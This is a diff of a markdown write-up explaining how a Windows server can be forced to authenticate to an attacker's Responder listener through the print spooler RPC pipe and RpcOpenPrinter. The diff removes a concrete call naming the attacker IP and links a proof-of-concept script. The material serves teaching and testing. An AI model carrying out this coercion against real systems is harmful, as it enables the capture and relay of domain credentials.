@@ -24,7 +24,7 @@ Then we need to connect to the remote SMB pipe `\PIPE\spoolss` and bind to (uuid
 The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\spoolss`. This pipe is connected to the protocol [[MS-RPRN]: Print System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) and allows to call RPC functions of this protocol. It will then call the remote [`RpcOpenPrinter`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f) function on the Windows Server (192.168.2.1) with the following parameters:
 
 ```cpp
-RpcOpenPrinter('192.168.2.51\x00', 'test\x00', 1)
+RpcOpenPrinter(...)
 ```
 
 We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
@@ -72,5 +72,6 @@ DWORD RpcOpenPrinter(
 ## References
 
  - Documentation of protocol [MS-RPRN]: Print System Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1
+
 
  - Documentation of function `RpcOpenPrinter`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f
